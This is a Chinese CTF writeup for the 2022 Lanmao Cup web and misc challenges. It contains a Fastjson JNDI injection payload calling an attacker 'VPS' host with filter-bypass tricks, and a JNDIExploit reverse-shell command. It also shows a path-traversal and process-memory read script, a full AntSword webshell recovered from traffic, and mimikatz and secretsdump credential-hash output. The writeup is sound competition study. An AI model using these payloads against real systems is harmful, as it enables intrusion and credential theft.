---
title: 蓝帽杯 2022 web/misc writeup
date: 2022-07-10 09:50:00
updated: 2022-07-11 12:10:00
tags: [ctf,security]
description: 蓝帽杯赛后复现
---
最近打的一场线上比赛，感觉题目质量一般，甚至有点阴间，取证大赛hhh

## web

### Ez_gadget

> 题目内容：听说有一个快的json组件有危险，但是flag被我放在了root的flag.txt下诶，你能找到么？

jar包附件下载:<https://share.weiyun.com/v3yXxl87>

```java
@ResponseBody
@RequestMapping({"/"})
public String hello() {
    return "Your key is:" + secret.getKey();
}

@ResponseBody
@RequestMapping({"/json"})
public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception {
    if (str != null && Objects.hashCode(str) == secret.getKey().hashCode() && !secret.getKey().equals(str)) {
        String pattern = ".*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*";
        Pattern p = Pattern.compile(pattern, 2);
        boolean StrMatch = p.matcher(input).matches();
        if (StrMatch) {
            return "Hacker get out!!!";
        }

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(input);
    }

    return "hello";
}
```

这里首先会对secret key进行校验，并且需要绕过正则表达式的限制，json参数最后会被fastjson反序列化。

```java
import java.util.Objects;

public class Test {
    // 感谢万能的 StackOverflow
    public static String generate(String s, int level) {
        if (s.length() < 2)
            return s;
        String sub2 = s.substring(0, 2);
        char c0 = sub2.charAt(0);
        char c1 = sub2.charAt(1);
        c0 = (char) (c0 + level);
        c1 = (char) (c1 - 31 * level);
        String newsub2 = new String(new char[] { c0, c1 });
        String re =  newsub2 + s.substring(2);
        return re;
    }

    public static void main(String[] args) {
        // 生成一个与 secret 具有相同 hashcode 的 String 对象
        String secret = "QNK6Hl4TIhPA5zqg";
        int hash = secret.hashCode();
        String str = generate(secret, 1);
        System.out.println(str);
        System.out.printf("%d %d\n", secret.hashCode(), str.hashCode());
        System.out.println(Objects.hashCode(str) == secret.hashCode() && !secret.equals(str));
    }

}
```

这样就可以生成secret key,不过比赛时知道是打CVE-2022-25845，不过并没有想到如何绕过正则表达式的校验。

参考文章<http://h0cksr.xyz/archives/709>、<https://www.anquanke.com/post/id/232774>

这里使用的是Fastjson 1.2.62的版本，存在CVE-2022-25845这个反序列化漏洞，CVE-2022-25845要求开启AutoType,题目也确实开了，符合完成利用的条件。

Fastjson 1.2.62 exp：

```java
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://VPS:port/Evil"}";
```

由于存在`jndi,rmi,ldap,\x`的过滤，需要用unicode编码绕过。

```java
str=xxxxxxxx&input={"@type":"org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter","AsText":"\u006c\u0064\u0061\u0070://VPS:port/Evil"}
```

利用换行%0a绕过Pattern.compile。

```java
str=xxxxxxxx&input={"@type":"org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter","AsText":"%0aldap://VPS:port/Evil"}
```

最后使用工具JNDIEXPloit反弹shell。

```java
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps -p 8080 -l 8089
```
### file_session

由于没怎么了解过java安全，所以比赛时主要在做这道，但是最后这也是个0解题，并且到现在也没看到官方wp,而且交流群内各位师傅基本上都卡在如何读取secret_key从而伪造session上了，要么是不知道怎么读secret_key像我一样，要么就是读到了但是靶机识别不了伪造的session。

来说说当时的解题思路和赛后复现的情况。

首先访问站点，发现服务端存在接口`/download?file=static/image/1.jpg`，可以下载服务端的静态资源。

用payload：`/download?file=static/../../../etc/passwd`发现这个接口可以目录穿越，存在任意文件读取漏洞。

那么我们可以用`file=/proc/self/cmdline`查看当前进程的命令

回显 `python3.8/app/app.py`

接下来用payload：`/download?file=static/../../../app/app.py`读取源码。

```python
import base64
import os
import uuid

from flask import Flask, request, session, render_template

from pickle import _loads

SECRET_KEY = str(uuid.uuid4())

app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY=SECRET_KEY,
))

# apt install python3.8

@app.route('/', methods=['GET'])
def index():
    return render_template("index.html")

@app.route('/download', methods=["GET", 'POST'])
def download():
    filename = request.args.get('file', "static/image/1.jpg")
    offset = request.args.get('offset', "0")
    length = request.args.get('length', "0")
    if offset == "0" and length == "0":
        return open(filename, "rb").read()
    else:
        offset, length = int(offset), int(length)
        f = open(filename, "rb")
        f.seek(offset)
        ret_data = f.read(length)
        return ret_data

@app.route('/filelist', methods=["GET"])
def filelist():
    return f"{str(os.listdir('./static/image/'))} /download?file=static/image/1.jpg"

@app.route('/admin_pickle_load', methods=["GET"])
def admin_pickle_load():
    if session.get('data'):
        data = _loads(base64.b64decode(session['data']))
        return data
    session["data"] = base64.b64encode(b"error")
    return 'admin pickle'

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=8888)
```

发现接口/admin_pickle_load会将session中的data字段的值base64解码后反序列化并且返回，这里应该是反序列化漏洞。

需要用到这个<https://github.com/noraj/flask-session-cookie-manager>，flask的session编码/解码工具，利用这个工具来伪造session,接下来我们只需要管怎么通过反序列化后的值实现RCE。

```bash
~/workspace/projects/CTF/LMCTF/web/python/flask-session-cookie-manager master
❯ flask-session-cookie-manager3 decode -c eyJkYXRhIjp7IiBiIjoiV2xoS2VXSXpTVDA9In19.cN0A5g.Z3i_uGPUgXzNn5BuOUKaMvFfbLo

b'{"data":{" b":"WlhKeWIzST0="}}' // 这个base64解码两次就是error
```

还有个问题，伪造session需要知道SECRET_KEY。这看起来SECRET_KEY是放在config这个子类当中的,通过/proc/self/environ可以读取这个进程的环境变量，但是也没有啊，变量应该在内存中吧，那怎么读呢？

```python
SECRET_KEY = str(uuid.uuid4())
app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY=SECRET_KEY,
))
```

上面就是比赛时的思考，赛后和atao师傅交流了一下，发现可以通过`/proc/self/maps`和`/proc/self/mem`读取这个进程的内存，从而获取uuid。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import re
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

url_1 = "http://xxx.xxx.xxx.xxx:8888/download?file=../../../../../proc/self/maps"
res = requests.get(url_1)
maplist = res.text.split("\n")

for i in maplist:
    m = re.match(r"([0-9A-Fa-f]+)-([0-9A-Fa-f]+) rw", i)
    if m != None:
        start = int(m.group(1), 16)
        end = int(m.group(2), 16)
        url_2 = "http://xxx.xxx.xxx.xxx:8888/download?file=../../../../../proc/self/mem&offset={}&length={}".format(
            start, end - start)
        res_1 = requests.get(url_2)
        if "Blueprint.before_app_request" in res_1.text:
            print start
            print end-start
```

但是神奇的是远程环境读到secret_key后，却没有办法识别到伪造的session,不知道为什么，但是在本地却可以。

当pickle反序列化后就可以直接RCE，并不用像PHP这样需要找反序列化链找危险函数来达成RCE.

参考文章<https://zhuanlan.zhihu.com/p/89132768>

## misc

### domainhacker

> 公司安全部门，在流量设备中发现了疑似黑客入侵的痕迹，用户似乎获取了机器的hash，你能通过分析流量，找到机器的hash吗？flag格式：flag{hash_of_machine}

参考文章<https://ylcao.top/2022/07/09/2022%E8%93%9D%E5%B8%BD%E6%9D%AFwp/#domainhacker>复现

流量包分析的一道题目，先用wireshark导出http对象

![图 1](https://s2.loli.net/2022/07/11/E8G6gCZciHalQoM.png)  

导出了一些php文件和一个压缩包，显然我们要找压缩包密码。

![图 2](https://s2.loli.net/2022/07/11/juvWTHX4Vc8MJNi.png)  

在1.php里面发现是一段php代码和一些参数，格式化一下看看这部分php代码在做什么。

```php
<?php
a = @ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split("/;|:/", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.c46a89a";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", " /");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return $out;
};
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "79c2" . "0b92";
    echo @asenc($output);
    echo "b4e7e" . "465b62";
}
ob_start();
try {
    $p = base64_decode(substr($_POST["yee092cda97a62"], 2));
    $s = base64_decode(substr($_POST["q8fb9d4c082c11"], 2));
    $envstr = @base64_decode(substr($_POST["p48a6d55fac1b1"], 2));
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
    if (substr($d, 0, 1) == "/") {
        @putenv("PATH=" . getenv(" PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    } else {
        @putenv("PATH=" . getenv(" PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    if (!empty($envstr)) {
        $envarr = explode("|||asline|||", $envstr);
        foreach ($envarr as $v) {
            if (!empty($v)) {
                @putenv(str_replace("|||askey|||", "=", $v));
            }
        }
    }
    $r = "{$p} {$c}";
    function fe($f)
    {
        $d = explode(",", @ini_get("disable_functions"));
        if (empty($d)) {
            $d = array();
        } else {
            $d = array_map('trim', array_map('strtolower', $d));
        }
        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
    };
    function runshellshock($d, $c)
    {
        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
            if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                $tmp = tempnam(sys_get_temp_dir(), 'as');
                putenv("PHP_LOL=() { x; }; $c>$tmp 2>&1");
                if (fe('error_log')) {
                    error_log("a", 1);
                } else {
                    mail("a@127.0.0.1", "", "", "-bv");
                }
            } else {
                return False;
            }
            $output = @file_get_contents($tmp);
            @unlink($tmp);
            if ($output != "") {
                print($output);
                return True;
            }
        }
        return False;
    };
    function runcmd($c)
    {
        $ret = 0;
        $d = dirname($_SERVER["SCRIPT_FILENAME"]);
        if (fe('system')) {
            @system($c, $ret);
        } elseif (fe('passthru')) {
            @passthru($c, $ret);
        } elseif (fe('shell_exec')) {
            print(@shell_exec($c));
        } elseif (fe('exec')) {
            @exec($c, $o, $ret);
            print(join("
    ", $o));
        } elseif (fe('popen')) {
            $fp = @popen($c, 'r');
            while (!@feof($fp)) {
                print(@fgets($fp, 2048));
            }
            @pclose($fp);
        } elseif (fe('proc_open')) {
            $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
            while (!@feof($io[1])) {
                print(@fgets($io[1], 2048));
            }
            while (!@feof($io[2])) {
                print(@fgets($io[2], 2048));
            }
            @fclose($io[1]);
            @fclose($io[2]);
            @proc_close($p);
        } elseif (fe('antsystem')) {
            @antsystem($c);
        } elseif (runshellshock($d, $c)) {
            return $ret;
        } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
            $w = new COM('WScript.shell');
            $e = $w->exec($c);
            $so = $e->StdOut();
            $ret .= $so->ReadAll();
            $se = $e->StdErr();
            $ret .= $se->ReadAll();
            print($ret);
        } else {
            $ret = 127;
        }
        return $ret;
    };
    $ret = @runcmd($r . " 2>&1");
    print ($ret != 0) ? "ret={$ret}" : "";;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();
```

发现是对传入的3个参数的base64截取前2个字符后进行拼接，那么拼接后解码就可以得到执行的命令了，在1(16)中可以找到压缩包相关命令。

![图 4](https://s2.loli.net/2022/07/11/ClViDBnAmUKwRuo.png)  

压缩包密码为`SecretsPassw0rds`

解压得到txt文件内容如下

```txt
  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 29 2021 11:16:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz(commandline) # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : PDC$
Domain            : TEST
Logon Server      : (null)
Logon Time        : 2022/4/15 22:22:24
SID               : S-1-5-20
 msv : 
  [00000003] Primary
  * Username : PDC$
  * Domain   : TEST
  * NTLM     : 416f89c3a5deb1d398a1a1fce93862a7
  * SHA1     : 54896b6f5e60e9be2b46332b13d0e0f110d6518f
 tspkg : 
 wdigest : 
  * Username : PDC$
  * Domain   : TEST
  * Password : (null)
 kerberos : 
  * Username : pdc$
  * Domain   : test.local
  * Password : 15 e0 7e 07 d9 9d 3d 42 45 40 38 ec 97 d6 25 59 c9 e8 05 d9 fa bd 81 f9 2e 05 67 84 e1 a3 a3 ec eb 65 ba 6e b9 60 9b dd 5a 74 4b 2e 07 68 94 fd a1 cb 2e 7b a2 13 07 31 34 c2 1d e8 95 53 43 38 61 91 53 2b c4 b0 3e ea 7a ac 03 60 1f bf e8 dc 00 c5 fe 13 ed 7a ca 88 32 fc d0 c6 ea d2 c7 b4 87 31 82 dd 4c 96 4f 23 80 39 2e 31 b0 cf 67 8e 63 b2 5e f9 77 32 44 05 8e 22 f9 0c 69 32 64 1b b8 2d a0 99 0e b8 0e 2c 10 b6 ff 6d 5f 11 c9 5e 46 eb 62 df 00 7a bd c6 7b 83 db 0f 58 ed ac a3 66 dd c2 ec df 9f 22 b3 34 0d 07 89 ea 3b 2b b1 e1 f9 e2 e5 85 cd a3 78 ae dd e3 98 78 39 8e 4f 49 5a b6 05 4c 6d 1a e6 fa 30 c7 c6 fb 4d dc b4 ca f6 3c 20 fe 70 eb e3 16 82 78 f8 49 8d 15 6a 15 10 ac d8 68 f8 ef ad 0c c2 39 f2 ca 80 ef 96 
 ssp : KO
 credman : 

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/4/15 22:22:24
SID               : S-1-5-19
 msv : 
 tspkg : 
 wdigest : 
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
 kerberos : 
  * Username : (null)
  * Domain   : (null)
  * Password : (null)
 ssp : KO
 credman : 

Authentication Id : 0 ; 70157 (00000000:0001120d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2022/4/15 22:22:24
SID               : S-1-5-90-1
 msv : 
  [00000003] Primary
  * Username : PDC$
  * Domain   : TEST
  * NTLM     : 416f89c3a5deb1d398a1a1fce93862a7
  * SHA1     : 54896b6f5e60e9be2b46332b13d0e0f110d6518f
 tspkg : 
 wdigest : 
  * Username : PDC$
  * Domain   : TEST
  * Password : (null)
 kerberos : 
  * Username : PDC$
  * Domain   : test.local
  * Password : 15 e0 7e 07 d9 9d 3d 42 45 40 38 ec 97 d6 25 59 c9 e8 05 d9 fa bd 81 f9 2e 05 67 84 e1 a3 a3 ec eb 65 ba 6e b9 60 9b dd 5a 74 4b 2e 07 68 94 fd a1 cb 2e 7b a2 13 07 31 34 c2 1d e8 95 53 43 38 61 91 53 2b c4 b0 3e ea 7a ac 03 60 1f bf e8 dc 00 c5 fe 13 ed 7a ca 88 32 fc d0 c6 ea d2 c7 b4 87 31 82 dd 4c 96 4f 23 80 39 2e 31 b0 cf 67 8e 63 b2 5e f9 77 32 44 05 8e 22 f9 0c 69 32 64 1b b8 2d a0 99 0e b8 0e 2c 10 b6 ff 6d 5f 11 c9 5e 46 eb 62 df 00 7a bd c6 7b 83 db 0f 58 ed ac a3 66 dd c2 ec df 9f 22 b3 34 0d 07 89 ea 3b 2b b1 e1 f9 e2 e5 85 cd a3 78 ae dd e3 98 78 39 8e 4f 49 5a b6 05 4c 6d 1a e6 fa 30 c7 c6 fb 4d dc b4 ca f6 3c 20 fe 70 eb e3 16 82 78 f8 49 8d 15 6a 15 10 ac d8 68 f8 ef ad 0c c2 39 f2 ca 80 ef 96 
 ssp : KO
 credman : 

Authentication Id : 0 ; 267962 (00000000:000416ba)
Session           : Interactive from 1
User Name         : administrator
Domain            : TEST
Logon Server      : PDC
Logon Time        : 2022/4/15 22:28:02
SID               : S-1-5-21-3633886114-1307863022-927341053-500
 msv : 
  [00000003] Primary
  * Username : Administrator
  * Domain   : TEST
  * NTLM     : a85016dddda9fe5a980272af8f54f20e
  * SHA1     : 6f5f2ed7cc12564ac756917b3ee54d5396bed5ad
  [00010000] CredentialKeys
  * NTLM     : a85016dddda9fe5a980272af8f54f20e
  * SHA1     : 6f5f2ed7cc12564ac756917b3ee54d5396bed5ad
 tspkg : 
 wdigest : 
  * Username : Administrator
  * Domain   : TEST
  * Password : (null)
 kerberos : 
  * Username : administrator
  * Domain   : TEST.LOCAL
  * Password : (null)
 ssp : KO
 credman : 

Authentication Id : 0 ; 70375 (00000000:000112e7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2022/4/15 22:22:24
SID               : S-1-5-90-1
 msv : 
  [00000003] Primary
  * Username : PDC$
  * Domain   : TEST
  * NTLM     : 416f89c3a5deb1d398a1a1fce93862a7
  * SHA1     : 54896b6f5e60e9be2b46332b13d0e0f110d6518f
 tspkg : 
 wdigest : 
  * Username : PDC$
  * Domain   : TEST
  * Password : (null)
 kerberos : 
  * Username : PDC$
  * Domain   : test.local
  * Password : 15 e0 7e 07 d9 9d 3d 42 45 40 38 ec 97 d6 25 59 c9 e8 05 d9 fa bd 81 f9 2e 05 67 84 e1 a3 a3 ec eb 65 ba 6e b9 60 9b dd 5a 74 4b 2e 07 68 94 fd a1 cb 2e 7b a2 13 07 31 34 c2 1d e8 95 53 43 38 61 91 53 2b c4 b0 3e ea 7a ac 03 60 1f bf e8 dc 00 c5 fe 13 ed 7a ca 88 32 fc d0 c6 ea d2 c7 b4 87 31 82 dd 4c 96 4f 23 80 39 2e 31 b0 cf 67 8e 63 b2 5e f9 77 32 44 05 8e 22 f9 0c 69 32 64 1b b8 2d a0 99 0e b8 0e 2c 10 b6 ff 6d 5f 11 c9 5e 46 eb 62 df 00 7a bd c6 7b 83 db 0f 58 ed ac a3 66 dd c2 ec df 9f 22 b3 34 0d 07 89 ea 3b 2b b1 e1 f9 e2 e5 85 cd a3 78 ae dd e3 98 78 39 8e 4f 49 5a b6 05 4c 6d 1a e6 fa 30 c7 c6 fb 4d dc b4 ca f6 3c 20 fe 70 eb e3 16 82 78 f8 49 8d 15 6a 15 10 ac d8 68 f8 ef ad 0c c2 39 f2 ca 80 ef 96 
 ssp : KO
 credman : 

Authentication Id : 0 ; 46127 (00000000:0000b42f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2022/4/15 22:22:21
SID               : 
 msv : 
  [00000003] Primary
  * Username : PDC$
  * Domain   : TEST
  * NTLM     : 416f89c3a5deb1d398a1a1fce93862a7
  * SHA1     : 54896b6f5e60e9be2b46332b13d0e0f110d6518f
 tspkg : 
 wdigest : 
 kerberos : 
 ssp : KO
 credman : 

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : PDC$
Domain            : TEST
Logon Server      : (null)
Logon Time        : 2022/4/15 22:22:21
SID               : S-1-5-18
 msv : 
 tspkg : 
 wdigest : 
  * Username : PDC$
  * Domain   : TEST
  * Password : (null)
 kerberos : 
  * Username : pdc$
  * Domain   : TEST.LOCAL
  * Password : (null)
 ssp : KO
 credman : 

mimikatz(commandline) # exit
Bye!
```

这是mimikatz工具抓下来的windows帐号和密码，flag值需要尝试，发现是NTLM的值。

![图 5](https://s2.loli.net/2022/07/11/PFDktE7ArR6VHoJ.png)  

### domainhacker2

可以通过一样的方法找到压缩包的密码`FakePassword123$`。

解压后得到3个文件，可以使用Impacket中的secretsdump可以提取ntds.dit中的hash

<https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py>

这里很坑的是需要使用history模式，要加个参数，否则看不到，比赛时就是因为这个没做出来。

```
~/workspace/projects/CTF/LMCTF/misc/pcapng
❯ python ./secretsdump.py -system SYSTEM -ntds ./ntds.dit LOCAL -history
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xf5a55bb9181f33269276949d2ad680e5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 752aa10b88b269bd735d54b802d5c86c
[*] Reading and decrypting hashes from ./ntds.dit 
test.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:a85016dddda9fe5a980272af8f54f20e:::
test.local\Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:07ab403ab740c1540c378b0f5aaa4087:::
test.local\Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:34e92e3e4267aa7055a284d9ece2a3ee:::
test.local\Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:34e92e3e4267aa7055a284d9ece2a3ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Admin:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
test:1003:aad3b435b51404eeaad3b435b51404ee:4f95f1c5acfc3b972a1ce2a29ef1f1c5:::
test_history0:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
test_history1:1003:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
PDC$:1004:aad3b435b51404eeaad3b435b51404ee:416f89c3a5deb1d398a1a1fce93862a7:::
PDC$_history0:1004:aad3b435b51404eeaad3b435b51404ee:77c3da77dc1b7a6c257ba59cd4633209:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8d9c46df1a433693842082203898424f:::
EXCHANGE$:1107:aad3b435b51404eeaad3b435b51404ee:8f203498c3054ed0e01efc9d1da10ecd:::
EXCHANGE$_history0:1107:aad3b435b51404eeaad3b435b51404ee:c5c7378155dc9d28ad53d8c1f9e9d915:::
test.local\$731000-68GJ1H3VU01P:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_96e3b8005d5c4140a:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_2e01c85cf3c346a3b:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_70dd52fc546d40e69:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_232124d96e734743a:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_5cbb0f422e264c8a9:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_8795fe36df7a4bf6b:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_c5b767869d8842e5a:1134:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_c648e6ab382f45d1b:1135:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\SM_728e72cf36894b339:1136:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test.local\HealthMailbox2b984a7:1138:aad3b435b51404eeaad3b435b51404ee:90fcf26701d2940adc23490f350e1b1f:::
test.local\HealthMailbox2b984a7_history0:1138:aad3b435b51404eeaad3b435b51404ee:96646d086dd466ec94185a2c7b9c17fa:::
test.local\HealthMailbox2b984a7_history1:1138:aad3b435b51404eeaad3b435b51404ee:ad3ccf8843b45284fe51b8b99c133495:::
test.local\HealthMailbox2b984a7_history2:1138:aad3b435b51404eeaad3b435b51404ee:c8e99d5df4d516be61317256509e2275:::
test.local\HealthMailbox2b984a7_history3:1138:aad3b435b51404eeaad3b435b51404ee:5ac3f429bde2a0965374d11b48bfd754:::
test.local\HealthMailbox2b984a7_history4:1138:aad3b435b51404eeaad3b435b51404ee:6c6fc37ceaacc4c16e4b9cffb8bb6078:::
test.local\HealthMailbox2b984a7_history5:1138:aad3b435b51404eeaad3b435b51404ee:d00738549e4a7d7df058c74b6f7e95d0:::
test.local\HealthMailbox2b984a7_history6:1138:aad3b435b51404eeaad3b435b51404ee:c8c128137b9d3af02ca2eb5a14d1eb5c:::
test.local\HealthMailbox2b984a7_history7:1138:aad3b435b51404eeaad3b435b51404ee:086ad625acdf6418726ee80fbe77bac1:::
test.local\HealthMailbox2b984a7_history8:1138:aad3b435b51404eeaad3b435b51404ee:47bce15df4f1b7542e9800c33bf25bba:::
test.local\HealthMailbox2b984a7_history9:1138:aad3b435b51404eeaad3b435b51404ee:6da377d04f52cdcd7b5378ce316452f5:::
test.local\HealthMailbox2b984a7_history10:1138:aad3b435b51404eeaad3b435b51404ee:d02a7132b0d76ccfbe14e84a09eaf9bb:::
test.local\HealthMailbox2b984a7_history11:1138:aad3b435b51404eeaad3b435b51404ee:fb0c2e03ae66feb701dd091fe2273235:::
test.local\HealthMailbox2b984a7_history12:1138:aad3b435b51404eeaad3b435b51404ee:057f521daecf81a740c2ee06080c6b3d:::
test.local\HealthMailbox2b984a7_history13:1138:aad3b435b51404eeaad3b435b51404ee:b7da54d4b875423a8e3aad2d2dc21254:::
test.local\HealthMailbox2b984a7_history14:1138:aad3b435b51404eeaad3b435b51404ee:e33159ef9ffcc6244f203ac2a0d3219e:::
test.local\HealthMailbox2b984a7_history15:1138:aad3b435b51404eeaad3b435b51404ee:1e1064142039eea0c5430bd331bd397a:::
test.local\HealthMailbox2b984a7_history16:1138:aad3b435b51404eeaad3b435b51404ee:d7370fcf3fcb56df7904b31f4e9a0231:::
test.local\HealthMailbox2b984a7_history17:1138:aad3b435b51404eeaad3b435b51404ee:93f1687c33c8bd447ccae732023656ff:::
test.local\HealthMailbox2b984a7_history18:1138:aad3b435b51404eeaad3b435b51404ee:4b74de4285f91b74534b6e48f24f051d:::
test.local\HealthMailbox2b984a7_history19:1138:aad3b435b51404eeaad3b435b51404ee:0011c835e6069a928b383229e8a97a5d:::
test.local\HealthMailbox2b984a7_history20:1138:aad3b435b51404eeaad3b435b51404ee:ad1445b5de261685ffae8d9fc3328c23:::
test.local\HealthMailbox2b984a7_history21:1138:aad3b435b51404eeaad3b435b51404ee:3ac2a81cc32220229d172a02959feff6:::
test.local\HealthMailbox2b984a7_history22:1138:aad3b435b51404eeaad3b435b51404ee:b681bd5621aa94626699cc20309e40a2:::
test.local\HealthMailbox5df812c:1139:aad3b435b51404eeaad3b435b51404ee:ad1b5c6c9f429b9d8da03b2f513bfb21:::
test.local\HealthMailbox5df812c_history0:1139:aad3b435b51404eeaad3b435b51404ee:8d70f5913a3f8f4230c198b6bd21bea4:::
test.local\HealthMailbox5df812c_history1:1139:aad3b435b51404eeaad3b435b51404ee:48c53f8e86480200501c0319ce48e600:::
test.local\HealthMailbox5df812c_history2:1139:aad3b435b51404eeaad3b435b51404ee:c6537dcddf1760d0b0ac1f8713b36077:::
test.local\HealthMailbox5df812c_history3:1139:aad3b435b51404eeaad3b435b51404ee:a9a22c02adfde8a7eb0fa5b87ed6bb46:::
test.local\HealthMailbox5df812c_history4:1139:aad3b435b51404eeaad3b435b51404ee:efac50761f947e690d55dc4189a36ca4:::
test.local\HealthMailbox5df812c_history5:1139:aad3b435b51404eeaad3b435b51404ee:f0983ac73f9b5f9cee165d6325c890cc:::
test.local\HealthMailbox5df812c_history6:1139:aad3b435b51404eeaad3b435b51404ee:a3803c33699c57445e70ed1ffcfd4468:::
test.local\HealthMailbox5df812c_history7:1139:aad3b435b51404eeaad3b435b51404ee:a76d66b799a1d82b9bfcf4636c8d584a:::
test.local\HealthMailbox5df812c_history8:1139:aad3b435b51404eeaad3b435b51404ee:098d09cf2e2074e2ccdb96f367c1bd2f:::
test.local\HealthMailbox5df812c_history9:1139:aad3b435b51404eeaad3b435b51404ee:8cdb552145ea464c6d89bc632110d88b:::
test.local\HealthMailbox5df812c_history10:1139:aad3b435b51404eeaad3b435b51404ee:9713b241407e2040e136928da279549f:::
test.local\HealthMailbox5df812c_history11:1139:aad3b435b51404eeaad3b435b51404ee:d50f1011dc2c12cc8432863a7063e321:::
test.local\HealthMailbox5df812c_history12:1139:aad3b435b51404eeaad3b435b51404ee:d00fd65e652c1fe3fadb8cb78201bd89:::
test.local\HealthMailbox5df812c_history13:1139:aad3b435b51404eeaad3b435b51404ee:15606e583f3782eaa98a208064d338e5:::
test.local\HealthMailbox5df812c_history14:1139:aad3b435b51404eeaad3b435b51404ee:c9e28fc8269eb9ec099800a5ebe2d61a:::
test.local\HealthMailbox5df812c_history15:1139:aad3b435b51404eeaad3b435b51404ee:4514033f5aec6fdf33eb4ed294618c6a:::
test.local\HealthMailbox5df812c_history16:1139:aad3b435b51404eeaad3b435b51404ee:198b9ca801cbff5119b6b7c6041d0e15:::
test.local\HealthMailbox5df812c_history17:1139:aad3b435b51404eeaad3b435b51404ee:9e5194eba3de209ddbbf9d4346492ab4:::
